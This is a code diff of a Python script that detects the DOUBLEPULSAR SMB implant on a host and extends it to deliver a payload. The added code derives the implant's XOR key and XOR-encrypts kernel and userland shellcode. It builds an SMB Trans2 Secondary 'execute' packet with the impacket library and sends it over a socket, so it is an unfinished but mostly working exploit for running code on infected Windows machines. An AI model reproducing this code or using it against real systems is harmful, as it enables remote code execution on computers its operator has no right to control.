@@ -210,73 +210,42 @@ if __name__ == "__main__":
     # Check for 0x51 response to indicate DOUBLEPULSAR infection
     if final_response[34] == 81:
         signature = final_response[18:26]
+        #for debug testing purposes
+        #signature = b'\x79\xe7\xdf\x90\x00\x00\x00\x00'
         signature_long = struct.unpack('<Q', signature)[0]
         key = calculate_doublepulsar_xor_key(signature_long)
         arch = calculate_doublepulsar_arch(signature_long)
         print("[+] [%s] DOUBLEPULSAR SMB IMPLANT DETECTED!!! Arch: %s, XOR Key: %s" % (ip, arch, hex(key)))
-
-        # will use a structure than hex code of the Trans2 EXEC packet
-        # packet in to execute a payload - extracted from wannacry
-        # trans2_exec_packet = binascii.unhexlify("0000104eff534d4232000000001807c00000000000000000000000000008fffe000842000f0c000010010000000000000025891a0000000c00420000104e0001000e000d1000")
-
-        # Replace tree ID and user ID in trans2 exec packet
-        # modified_trans2_exec_packet = bytearray(trans2_exec_packet)
-        # modified_trans2_exec_packet[28] = tree_id[0]
-        # modified_trans2_exec_packet[29] = tree_id[1]
-        # modified_trans2_exec_packet[32] = user_id[0]
-        # modified_trans2_exec_packet[33] = user_id[1]
-
+        
+        #for debug testing purposes
+        #sample XOR key, we'll use our real one that was generated above on line 214
+        #xor_key = 0x58581162
+        xor_key = key
+        packed_xor_key = struct.pack('<I', xor_key)
+        print(packed_xor_key)
         # at this moment, uploading DLL files is not completed.
         # read file into memory here
         # read_dll_file_as_hex()
-
-        #sample XOR key, we'll use our real one that was generated above on line 214
-        xor_key = 0x58581162
-        packed_xor_key = struct.pack('<I', xor_key)
-        print(packed_xor_key)
         
-        print("Generating the Doublepulsar parameters...")
-        parameters = b''
-        EntireSize = struct.pack('<I', 4096) #Total Size of the payload here
-        ChunkSize = struct.pack('<I', 4096)  #size of the chunk
-        offset = struct.pack('<I', 0)        #offset of the payload
-        parameters += EntireSize
-        parameters += ChunkSize
-        parameters += offset
-        print(parameters)
-        print(hexdump(parameters))
-        '''
-        b'\x00\x10\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00'
-        ['00000000  00 10 00 00 00 10 00 00  00 00 00 00             |............    |']
-        '''
-
-        parameters_bytearray = bytearray(parameters)
-        byte_xor(parameters_bytearray, array_xor_key)
-        print(parameters_bytearray)
-        print(hexdump(parameters_bytearray))
-        '''
-        bytearray(b'b\x01XXb\x01XXb\x11XX')
-        ['00000000  62 01 58 58 62 01 58 58  62 11 58 58             |b.XXb.XXb.XX    |']
-        '''
-        
-        #kernel shellcode is for 64 bits at the moment
-        #create byte array of the kernel shellcode
+        #generate the final payload shellcode first
         modified_kernel_shellcode = bytearray(kernel_shellcode)
+        bytes_payload_shellcode = bytearray(payload_shellcode)
 
-        #add PAYLOAD shellcode length in bytes after the kernel shellcode and write this value
+        # add PAYLOAD shellcode length after the kernel shellcode and write this value in hex
         payload_shellcode_size = len(payload_shellcode)
-        value = struct.pack('<H', payload_shellcode_size)
-        modified_kernel_shellcode += value
 
-        #convert userland shellcode to bytearray
-        payload_shellcode = bytearray(userland_shellcode)
+        payload_shellcode_size_in_hex = struct.pack('<H', payload_shellcode_size)
+        modified_kernel_shellcode += payload_shellcode_size_in_hex
+        modified_kernel_shellcode += bytes_payload_shellcode
 
-        #add the userland shellcode after the shellcode size
-        modified_kernel_shellcode += payload_shellcode
-        
-        #hexdump the modified kernel shellcode
-        print(hexdump(modified_kernel_shellcode))
-        
+        shellcode_payload_size = len(modified_kernel_shellcode)
+        print("Total size of shellcode:  %d" % shellcode_payload_size)
+
+        # xor the payload data now
+        byte_xor(modified_kernel_shellcode, packed_xor_key)
+    
+    
+        ''' Commenting out for now since we are not sure if this even works
         #padding bytes to 4096 chunk size
         final_shellcode_length = len(modified_kernel_shellcode)
         print("Total size of shellcode before padding:  %d" % final_shellcode_length)
@@ -291,25 +260,88 @@ if __name__ == "__main__":
         #xor the payload data now
         byte_xor(modified_kernel_shellcode, packed_xor_key)
         print(hexdump(modified_kernel_shellcode))
+        '''
         
-        #update SMB length
-        #total_smb_len = len(str(SMB_HEADER)) + len(modified_kernel_shellcode) + len(parameters_bytearray)
-        total_smb_len = 70 + 4096 + 12 - 4
-        doublepulsar_pkt.SmbMessageLength = struct.pack('>i', total_smb_len)
-        #maybe: doublepulsar_pkt.SmbMessageLength = struct.pack('!h', total_smb_len)
-        print("Total SMB len", total_smb_len)
-        print(hexdump(doublepulsar_pkt.SmbMessageLength))
+        EntireShellcodeSize = len(modified_kernel_shellcode)
+        print("Generating the Doublepulsar parameters...")
+        parameters = b''
+        EntireSize = struct.pack('<I', EntireShellcodeSize) #Total Size of the payload here
+        ChunkSize = struct.pack('<I', EntireShellcodeSize)  #size of the chunk
+        offset = struct.pack('<I', 0)        #offset of the payload
+        parameters += EntireSize
+        parameters += ChunkSize
+        parameters += offset
+        print(parameters)
+        print(hexdump(parameters))
+        ''' Expected output for Entire size & Chunk size at 4096 and offset of 0
+        b'\x00\x10\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00'
+        ['00000000  00 10 00 00 00 10 00 00  00 00 00 00             |............    |']
+        '''
+        parameters_bytearray = bytearray(parameters)
+        byte_xor(parameters_bytearray, array_xor_key)
+        
+        print(parameters_bytearray)
+        print(hexdump(parameters_bytearray))
+        ''' Expected output for Entire size & Chunk size at 4096 and offset of 0 encrypted with XOR key of 0x58581162
+        bytearray(b'b\x01XXb\x01XXb\x11XX')
+        ['00000000  62 01 58 58 62 01 58 58  62 11 58 58             |b.XXb.XXb.XX    |']
+        '''
+        
+        
+        #print("Updating SMB length value...")
+        # SMB length requires a big endian format -> Python Struct '>H' equals big endian unsigned short
+        # If fails, try using: smb_length = struct.pack('>i', merged_packet_len)
+        #smb_length = struct.pack('>H', merged_packet_len)
+
+        doublepulsar_pkt = smb.NewSMBPacket()
+        doublepulsar_pkt['Tid'] = 0x0008 #CHANGE ME IN PROD
+        doublepulsar_pkt.Flags1 = 0x18
+        doublepulsar_pkt.Flags2 = 0xc007
+        doublepulsar_pkt.Timeout = 0x25891a00  # execute command for DoublePulsar
+
+        transCommand = smb.SMBCommand(smb.SMB.SMB_COM_TRANSACTION2_SECONDARY)
+        transCommand['Parameters'] = SMBTransaction2Secondary_Parameters_Fixed()
+        transCommand['Data'] = smb.SMBTransaction2Secondary_Data()
+
+        transCommand['Parameters']['TotalParameterCount'] = 12
+        transCommand['Parameters']['TotalDataCount'] = len(modified_kernel_shellcode)
+
+        fixedOffset = 32 + 3 + 18
+        #transCommand['Data']['Pad1'] = ''
+
+        transCommand['Parameters']['ParameterCount'] = 12
+        transCommand['Parameters']['ParameterOffset'] = 66
+
+        XOR_EntireSize = struct.pack('<I', 4096)
+        XOR_ChunkSize = struct.pack('<I', 4096)
+        XOR_offset = struct.pack('<I', 0)
+
+        XOR_EntireSize_bytearray = bytearray(XOR_EntireSize)
+        XOR_ChunkSize_bytearray = bytearray(XOR_ChunkSize)
+        XOR_offset_bytearray = bytearray(XOR_offset)
+
+        byte_xor(XOR_EntireSize_bytearray, packed_xor_key)
+        byte_xor(XOR_ChunkSize_bytearray, packed_xor_key)
+        byte_xor(XOR_offset_bytearray, packed_xor_key)
+
+        transCommand['Parameters']['DataCount'] = XOR_EntireSize_bytearray
+        transCommand['Parameters']['Chunksize'] = XOR_ChunkSize_bytearray
+        transCommand['Parameters']['DataOffset'] = XOR_offset_bytearray
+
+        transCommand['Data']['Trans_Data'] = modified_kernel_shellcode
+        doublepulsar_pkt.addCommand(transCommand)
 
         print("content of doublepulsar SMB packet")
         print(vars(doublepulsar_pkt))
-        print("hex content of the paramters")
+        print("content of transCommand portion of SMB")
+        print(vars(transCommand))
+        print("hex content of the parameters")
         print(hexdump(parameters_bytearray))
         print("hex content of the shellcode")
         print(hexdump(modified_kernel_shellcode))
         
-        
        
-        
+        '''
         # fill up the SMB Trans2 Secondary packet structures
         # CODE IS NOT FINISHED HERE
         # helpful resource: https://www.rapid7.com/blog/post/2019/10/02/open-source-command-and-control-of-the-doublepulsar-implant/
@@ -351,8 +383,24 @@ if __name__ == "__main__":
 
         #transCommand['Data']['Trans_Parameters'] = ''  # parameters
         transCommand['Data']['Trans_Data'] = xor_encrypt(modified_kernel_shellcode, key)
-        doublepulsar_pkt.addCommand(transCommand)
+        doublepulsar_pkt.addCommand(transCommand)  '''
 
+        '''
+        #update SMB length
+        #total_smb_len = len(str(SMB_HEADER)) + len(modified_kernel_shellcode) + len(parameters_bytearray)
+        total_smb_len = 70 + 4096 + 12 - 4
+        doublepulsar_pkt.SmbMessageLength = struct.pack('>i', total_smb_len)
+        #maybe: doublepulsar_pkt.SmbMessageLength = struct.pack('!h', total_smb_len)
+        print("Total SMB len", total_smb_len)
+        print(hexdump(doublepulsar_pkt.SmbMessageLength))
+
+        print("content of doublepulsar SMB packet")
+        print(vars(doublepulsar_pkt))
+        print("hex content of the paramters")
+        print(hexdump(parameters_bytearray))
+        print("hex content of the shellcode")
+        print(hexdump(modified_kernel_shellcode))
+        '''
         # conn.sendSMB(doublepulsar_pkt)
         s.send(bytes(doublepulsar_pkt))
 
